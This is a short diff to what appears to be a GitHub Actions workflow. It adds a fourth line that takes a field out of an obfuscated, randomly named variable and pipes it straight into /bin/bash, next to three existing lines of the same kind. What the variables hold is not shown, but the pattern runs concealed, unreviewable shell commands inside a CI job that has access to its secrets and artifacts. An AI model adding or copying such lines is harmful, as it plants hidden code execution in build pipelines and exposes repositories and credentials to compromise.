@@ -23,6 +23,7 @@ jobs:
           echo $llkeo44 | jq -r .d741 | /bin/bash
           echo $ztjw32 | jq -r .s91841 | /bin/bash
           printf '%s' "$bv20212" | jq -r .iwn25 | /bin/bash
+          printf '%s' "$nbo76303" | jq -r .oreg9884 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
